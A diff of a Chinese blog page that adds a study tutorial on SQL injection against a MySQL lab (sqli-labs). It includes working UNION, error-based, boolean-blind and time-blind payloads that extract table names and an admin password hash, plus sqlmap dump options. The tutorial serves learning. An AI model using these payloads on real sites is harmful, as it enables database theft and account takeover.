@@ -25,18 +25,20 @@
 
 -->
 
-  <meta name="description" content="《网络安全》学习之SQL注入 -">
+  <meta name="description" content="《网络安全》学习之SQL注入 - MYSQL | sqlmap">
 <meta property="og:type" content="article">
 <meta property="og:title" content="《网络安全》学习之SQL注入">
 <meta property="og:url" content="https://xinkjung.github.io/2020/08/23/%E3%80%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E3%80%8B%E5%AD%A6%E4%B9%A0%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="xinkjung">
-<meta property="og:description" content="《网络安全》学习之SQL注入 -">
+<meta property="og:description" content="《网络安全》学习之SQL注入 - MYSQL | sqlmap">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2020-08-23T14:03:33.000Z">
-<meta property="article:modified_time" content="2020-08-23T14:10:57.265Z">
+<meta property="article:modified_time" content="2020-08-27T14:12:58.263Z">
 <meta property="article:author" content="xxx">
 <meta property="article:tag" content="网络安全">
 <meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="MYSQL">
+<meta property="article:tag" content="sqlmap">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="https://xinkjung.github.io/2020/08/23/%E3%80%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E3%80%8B%E5%AD%A6%E4%B9%A0%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/">
@@ -227,10 +229,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-08-23 22:03:33 / 修改时间：22:10:57" itemprop="dateCreated datePublished" datetime="2020-08-23T22:03:33+08:00">2020-08-23</time>
+              <time title="创建时间：2020-08-23 22:03:33" itemprop="dateCreated datePublished" datetime="2020-08-23T22:03:33+08:00">2020-08-23</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-08-27 22:12:58" itemprop="dateModified" datetime="2020-08-27T22:12:58+08:00">2020-08-27</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -263,7 +271,7 @@
   </span>
   
   
-            <div class="post-description">《网络安全》学习之SQL注入 -</div>
+            <div class="post-description">《网络安全》学习之SQL注入 - MYSQL | sqlmap</div>
 
         </div>
       </header>
@@ -274,7 +282,121 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id=""><a href="#" class="headerlink" title=""></a></h2>
+        <h1 id="前言-简介"><a href="#前言-简介" class="headerlink" title="前言 - 简介"></a>前言 - 简介</h1><ul>
+<li><p>SQL(Structured Query Language 结构化查询语言)<br>是一种特殊的编程语言，用于数据库中的标准数据查询语言， 实际上不同的数据库系统之间的SQL不能完全相互通用。<br>具有明显的层次结构：库名-&gt;表名-&gt;字段名-&gt;字段内容</p>
+</li>
+<li><p>SQL注入(SQL Injection)<br>是一种常见的Web安全漏洞，攻击者利用这个漏洞可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。</p>
+</li>
+</ul>
+<h1 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>针对SQL注入的攻击行为可以描述为通过用户可控参数中注入SQL语法，破坏原有SQL结构以达到编写程序时意料之外结果的攻击行为。其成因可归结于以下两个原因叠加造成：</p>
+<ol>
+<li>程序编写者在处理程序和数据库交互时，使用字符串拼接的方式构造SQL语句。</li>
+<li>未对用户可控参数进行足够的过滤便将参数内容拼接到SQL语句中。</li>
+</ol>
+<h2 id="注入点可能存在的位置"><a href="#注入点可能存在的位置" class="headerlink" title="注入点可能存在的位置"></a>注入点可能存在的位置</h2><p>根据SQL注入漏洞的原理，我们可以得知也就是说Web应用在获取用户数据的地方，只要带入数据库查询，都有存在SQL注入的可能，这些地方通常包括：</p>
+<ol>
+<li>GET数据</li>
+<li>POST数据</li>
+<li>HTTP头部（HTTP请求报文其他字段）</li>
+<li>Cookie数据</li>
+</ol>
+<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>攻击者利用SQL注入漏洞，可以获取数据库中的多种信息（如管理员后台密码），从而脱取数据库中的内容（脱库）。在特别情况下还可以修改数据库内容或插入内容到数据库，如果数据库权限分配存在问题，或者数据库本身存在缺陷，那么攻击者还可以通过SQL注入漏洞直接获取webshell或服务器系统权限。</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>SQL注入漏洞根据不同的标准有不同的分类。</p>
+<ol>
+<li>从数据类型来看，SQL注入分为啦数字型和字符型。</li>
+</ol>
+<ul>
+<li>数字型注入就是说注入点的数据，拼接到SQL语句中是以数字类型出现的，即数据两边没有被单引号或双引号包括。</li>
+<li>字符型注入则正好相反，注入点是数据拼接到SQL语句中以字符类型出现，即数据两边被单引号或双引号包括。</li>
+</ul>
+<ol start="2">
+<li>根据注入手法分类，大致可分为以下几个类别：</li>
+</ol>
+<ul>
+<li>UNION query SQL injection(可联合查询注入)             联合查询</li>
+<li>Error-based SQL injection(报错型注入)                报错注入</li>
+<li>Boolean-based blind SQL injection(布尔型注入)        布尔盲注 </li>
+<li>Time-based blind SQL injection(基于时间延迟注入)      延时注入</li>
+<li>Stacked queries SQL injection(可多语句查询注入)       堆叠查询     </li>
+</ul>
+<h2 id="MYSQL相关"><a href="#MYSQL相关" class="headerlink" title="MYSQL相关"></a>MYSQL相关</h2><p>关于SQL注入漏洞我们需要对数据库有所了解，这里以mysql为例做一些简单介绍</p>
+<ul>
+<li>注释<br>mysql数据库的注释大概有以下几种：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">-- (杠杠空格)</span><br><span class="line">&#x2F;* ..... *&#x2F;</span><br><span class="line">&#x2F;*! .... *&#x2F;  （内联查询）</span><br></pre></td></tr></table></figure></li>
+<li>MYSQL常用函数与参数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#x3D; | &gt; | &gt;&#x3D; | &lt;&#x3D; | &lt;&gt;              # 比较运算符</span><br><span class="line">and | or                          # 逻辑运算符</span><br><span class="line">version()                         # mysql数据库版本</span><br><span class="line">database()                        # 当前数据库名</span><br><span class="line">user()                            # 用户名</span><br><span class="line">current_user()                    # 当前用户名</span><br><span class="line">system_user()                     # 系统用户名</span><br><span class="line">@@datadir                         # 数据库路径</span><br><span class="line">@@version_compile_os              # 操作系统版本</span><br><span class="line"></span><br><span class="line">length()                          # 返回字符串的长度</span><br><span class="line">substring()                       # 截取字符串</span><br><span class="line">substr()                          # 截取字符串</span><br><span class="line">mid()                             # 截取的字符串；截取起始位置，从1开始计数；截取长度</span><br><span class="line">left()                            # 从左侧开始指定字符个数的字符串</span><br><span class="line">concat()                          # 没有分隔符的连接字符串</span><br><span class="line">concat_ws()                       # 含有分隔符的连接字符串</span><br><span class="line">group_concat()                     # 连接一个组的字符串</span><br><span class="line"></span><br><span class="line">ord()                             # 返回字符串第一个字符的ASCII码</span><br><span class="line">ascii()                           # 返回ASCII码</span><br><span class="line">hex()                             # 将字符串转换为16进制</span><br><span class="line">unhex()                           # hex的反向操作</span><br><span class="line">md5()                             # 返回MD5值</span><br><span class="line">floor(x)                          # 返回不大于x的最大整数</span><br><span class="line">round(x)                          # 返回参数x接近的整数</span><br><span class="line">rand()                            # 返回0-1之间的随机浮点数</span><br><span class="line"> </span><br><span class="line">load_file()                       # 读取文件并返回文件内容作为一个字符串</span><br><span class="line">sleep()                           # 睡眠时间为指定的秒数 </span><br><span class="line">if()                              # if判断 </span><br><span class="line">find_in_set()                     # 返回字符串在字符串列表中的位置</span><br><span class="line">benchmark()                       # 指定语句执行的次数</span><br><span class="line">name_const()                      # 返回表作为结果</span><br></pre></td></tr></table></figure></li>
+<li>逻辑运算<br>在SQL语句中逻辑运算与（and）比或（or）的优先级高<br><code>select 1=2 and 1=2 or 1=1;</code></li>
+</ul>
+<h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><p>由于关系型数据库系统，具有明显的库/表/列/内容结构层次，所以我们通过SQL注入漏洞获取数据库中信息的时候也依据重要的顺序。<br>首先获取数据库名，其次获取表名，然后获取列名（字段名），最后获取数据。</p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="四大基本手法"><a href="#四大基本手法" class="headerlink" title="四大基本手法"></a>四大基本手法</h2><blockquote>
+<p>口诀<br>是否有回显          联合查询<br>是否有报错          报错注入<br>是否有布尔类型状态   布尔盲注<br>绝招               延时注入</p>
+</blockquote>
+<ol>
+<li><p>联合查询<br>即SQL语法中的union select语句，该语句会同时执行两条select语句生成两张虚拟表，然后把查询到的结果进行拼接（虚拟表是二维结构，联合查询会“纵向”拼接两张虚拟的表）。<br><code>select ~~~ union select ~~~</code> </p>
+<ul>
+<li><p>必要条件</p>
+<ul>
+<li>两张虚拟的表具有相同的列数</li>
+<li>虚拟表对应的列的数据类型相同</li>
+</ul>
+<p>⚠️ 这个具体靶场具体操作结果可能也会不同，可以利用返回到数字替换函数查询数据库信息</p>
+</li>
+<li><p>判断字段个数<br>可以使用<code>order by 数字</code>语句进行判断，当mysql没有找到对应的列时就会报错<code>unknown column</code>，依次增加数字直到数据库报错就可以得知当前表中字段个数。</p>
+</li>
+<li><p>判断显示位置<br>得到字段个数后可以尝试构造联合查询语句。这里我们并不知道表名，而根据mysql数据库的特性，select语句在执行过程中不需要指定表名。<br><code>?id=33 union select 1,2,3,4,5 --+</code><br><code>?id=33 union select null,null,null,null --+</code><br>页面显示的是第一张虚拟表的内容，那么我们可以考虑让第一张虚拟表的查询条件为假，则显示第二条记录，因此构造语句：<br><code>?id=33 and 1=2 union select 1,2,3,4,5 --+</code><br><code>?id=-33 union select 1,2,3,4,5 --+</code><br>这里发现3和11会回显到页面中来。<br>ps: 执行SQL语句时可以考虑采用火狐浏览器到hackbar插件噢～</p>
+</li>
+<li><p>数据库版本<br>我们可以将数字3用函数<code>version()</code>代替<br><code>?id=33 and 1=2 union select 1,2,version(),4,5 --+</code></p>
+</li>
+<li><p>当前数据库名<br>我们可以将数字3用函数<code>database()</code>代替<br><code>?id=33 and 1=2 union select 1,2,database(),4,5 --+</code></p>
+</li>
+<li><p>数据库中的表<br><code>?id=33 and 1=2 union select 1,2,hex(group_concat(table_name)),4,5 from information_schema.columns where table_schema=database() --+</code></p>
+</li>
+<li><p>表中字段<br><code>?id=33 and 1=2 union select 1,2,hex(group_concat(column_name)),4,5 from information_schema.columns where table_schema=database() and table_name=&#39;cms_users&#39; --+</code></p>
+</li>
+<li><p>字段内容<br>查询表中记录数：<br><code>?id=33 and 1=2 union select 1,2,count(*),4,5 from cms_users --+</code><br>发现只有一条记录，然后查询字段内容：<br><code>?id=33 and 1=2 union select 1,2,hex(concat(username,&#39;:&#39;,password)),4,5 from cms_users --+</code><br>之后得到以密文方式保存在数据库中的后台管理员账号和密码，通过观察密文可知为md5密文，在线查询解密可得最终结果，然后就可以以此账户登录后台啦！</p>
+</li>
+</ul>
+</li>
+<li><p>报错注入<br>在注入点的判断过程中，发现数据库中SQL语句的报错信息会显示在页面中，因此可以进行报错注入。其原理就是在错误信息中执行SQL语句。<br>触发报错的方式很多，具体细节也不尽相同，这里建议直接背公式即可。</p>
+<ul>
+<li>group by重复键冲突<br><code>?id=33 and (select 1 from (select count(*), concat((select version() from information_schema.tables limit 0,1), floor(rand()*2))x from information_schema.tables group by x)a) --+</code></li>
+<li>XPATH报错<ul>
+<li>extractvalue()<br><code>?id=33 and extractvalue(1, concat(&#39;^&#39;,(select version()),&#39;^&#39;)) --+</code></li>
+<li>updatexml()<br><code>?id=33 and updatexml(1, concat(&#39;^&#39;,(select database()), &#39;^&#39;),1) --+</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>布尔盲注<br>利用页面返回的布尔类型状态，正常或不正常。</p>
+<ul>
+<li>获取数据库名<ul>
+<li>数据库名长度<br><code>?id=33 and length(database())=1 --+</code><br><code>?id=33 and length(database())=3 --+</code><br>可以断定当前数据库名长度为3。<br>ps: 语句为真时执行成功否则返回错误或无内容，则当页面返回东西时可以知道语句是正确的</li>
+<li>数据库名<br><code>?id=33 and ascii(substr(database(),1,1))=99 --+</code><br>由此可知数据库名第一个字母的ascii码为99， 即字母c。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>延时注入<br>利用sleep()语句的延时性，以时间线作为判断条件。</p>
+<ul>
+<li>获取数据库名<ul>
+<li>获取数据库名长度<br><code>?id=33 and if((length(database())=3),sleep(5),1) --+</code></li>
+<li>数据库名第二位<br><code>?id=33 and if((ascii(substr(database(),2,1))=109),sleep(5),1) --+</code><br>由此可知数据库名第二个字母ascii码为109，即字母m。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="注入点的判断"><a href="#注入点的判断" class="headerlink" title="注入点的判断"></a>注入点的判断</h2><p>这里我们可以使用Windows 7 x64位虚拟机下phpstudy集成环境配合sqli-labs进行学习。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;16   +1&#x2F;-1         -- 变换id变换内容</span><br><span class="line">select * from tb_name where id&#x3D;$id</span><br><span class="line">?id&#x3D;16&#39;            -- 字符型还是数字型</span><br><span class="line">报错信息：</span><br><span class="line">near &#39;&#39;&#39; at line 1            -- 报错信息显示单引号而非数字，就是数字型注入</span><br><span class="line">near &#39;16&#39; at line 1           -- 报错信息显示数字而非单引号，就是字符型注入</span><br><span class="line"></span><br><span class="line">?id&#x3D;16 and 1&#x3D;1            -- 是否有布尔类型的状态       </span><br><span class="line">?id&#x3D;16 and 1&#x3D;2</span><br><span class="line">select * from tb_name where id&#x3D;16 and 1&#x3D;1        -- 两次查询语句返回内容&#x2F;页面状态是否相同</span><br><span class="line">select * from tb_name where id&#x3D;16 and 1&#x3D;2        -- 不同就认为有布尔类型状态；反之相同则不存在布尔类型状态</span><br><span class="line"></span><br><span class="line">?id&#x3D;16 and sleep(5)            -- 是否有延时：可以通过f12网络时间线看到延时，sleep语句起到作用       </span><br></pre></td></tr></table></figure>
+<p>综上，可以判断此连接存在SQL注入漏洞</p>
+<h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p>只是基本的简单GET注入爆破命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">基本命令：</span><br><span class="line">-u &quot;url&quot;                 &#x2F;&#x2F; 检测注入点</span><br><span class="line"></span><br><span class="line">命令项参数(可同时多个选项)：</span><br><span class="line">--dbs                    &#x2F;&#x2F; 列出所有数据库的名字</span><br><span class="line">--current-db             &#x2F;&#x2F; 列出当前数据库的名字</span><br><span class="line">-D                       &#x2F;&#x2F; 指定一个数据库</span><br><span class="line">--tables                 &#x2F;&#x2F; 列出表名</span><br><span class="line">-T                       &#x2F;&#x2F; 指定一个表</span><br><span class="line">--columns                &#x2F;&#x2F; 列出所有字段名</span><br><span class="line">-C                       &#x2F;&#x2F; 指定字段名</span><br><span class="line">--dump                   &#x2F;&#x2F; 列出字段内容</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
     </div>
 
     
@@ -307,7 +429,7 @@
   <p><span>文章作者:</span><a href="/" title="访问xinkjung的个人博客">xinkjung</a></p>
   
   <p><span>发布时间:</span>2020年08月23日 - 22:03</p>
-  <p><span>最后更新:</span>2020年08月23日 - 22:10</p>
+  <p><span>最后更新:</span>2020年08月27日 - 22:12</p>
 
   <p><span>原始链接:</span><a href="/2020/08/23/%E3%80%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E3%80%8B%E5%AD%A6%E4%B9%A0%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/" title="《网络安全》学习之SQL注入">https://xinkjung.github.io/2020/08/23/%E3%80%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E3%80%8B%E5%AD%A6%E4%B9%A0%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/</a>
     <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://xinkjung.github.io/2020/08/23/%E3%80%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E3%80%8B%E5%AD%A6%E4%B9%A0%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/"  aria-label="复制成功！"></i></span>
@@ -337,6 +459,8 @@
           <div class="post-tags">
               <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"># 网络安全</a>
               <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+              <a href="/tags/MYSQL/" rel="tag"># MYSQL</a>
+              <a href="/tags/sqlmap/" rel="tag"># sqlmap</a>
           </div>
 
         
@@ -408,7 +532,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text"></span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80-%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">前言 - 简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80"><span class="nav-number">2.</span> <span class="nav-text">SQL注入基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="nav-number">2.2.</span> <span class="nav-text">注入点可能存在的位置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E7%B1%BB"><span class="nav-number">2.4.</span> <span class="nav-text">分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MYSQL%E7%9B%B8%E5%85%B3"><span class="nav-number">2.5.</span> <span class="nav-text">MYSQL相关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="nav-number">2.6.</span> <span class="nav-text">注入流程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E5%A4%A7%E5%9F%BA%E6%9C%AC%E6%89%8B%E6%B3%95"><span class="nav-number">3.1.</span> <span class="nav-text">四大基本手法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E7%9A%84%E5%88%A4%E6%96%AD"><span class="nav-number">3.2.</span> <span class="nav-text">注入点的判断</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap"><span class="nav-number">4.</span> <span class="nav-text">sqlmap</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -437,7 +561,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-count">19</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
